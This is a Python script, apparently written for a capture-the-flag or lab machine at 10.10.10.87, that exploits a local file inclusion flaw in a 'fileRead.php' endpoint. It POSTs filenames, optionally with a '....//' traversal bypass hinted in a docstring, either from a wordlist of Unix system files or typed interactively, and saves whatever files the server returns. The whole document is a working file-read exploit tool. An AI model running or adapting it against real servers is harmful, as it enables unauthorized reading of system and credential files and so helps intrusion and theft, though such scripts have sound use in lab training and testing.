#!/usr/bin/python3

import requests
import base64
import re
import sys
import os

WL="unix.txt"
BASE_URL = "http://10.10.10.87/fileRead.php"
OUTPUT_DIR = "lfi_fextractor_out/"

def make_payload(f):
	"""
	Given a filename prepare it as a payload to be sent
	e.g f -> '....//....//..../{f}'
	"""
	return f


def extract_content(r):
	"""
	Given a requests response object, return the file content as a string
	"""
	return r.content

def is_success(r):
	# return r.status_code == 200
	return not '"file":false' in r.content.decode()


def request_file_content(f):
	payload = make_payload(f)
	url = BASE_URL
	print(f"requesting {f}:\t\t", end="")
	r = requests.post(url, data={"file":payload})

	if not is_success(r):
		print("[NOT_FOUND]")
		return
	else:
		print("[FOUND]")
		return extract_content(r)


def save_file(fname, fcontent):
	prepared_fname = fname.replace('/','_')
	with open(OUTPUT_DIR+prepared_fname, 'w') as fd:
		fd.write(fcontent)


# todo threading
def batch():
	with open(WL,'r') as f:
		files = [l.strip() for l in f.readlines()]

	for fname in files:
		file_content = request_file_content(fname)
		if not file_content: continue
		save_file(fname, file_content)


def interactive():
	while True:
		fname = input('filename: ')
		file_content = request_file_content(fname)
		if not file_content:
			print("Not found")
			continue
		print('\n\n'+file_content+'\n\n')
		save_file(fname, file_content)


if __name__ == '__main__':
	mode = sys.argv[1]

	if not os.path.exists(OUTPUT_DIR):
		os.mkdir(OUTPUT_DIR)

	if mode == 'interactive':
		interactive()
	elif mode == 'batch':
		batch()
	else:
		print(f'usage {sys.argv[0]} interactive|batch')
		exit(1)

print('Done')
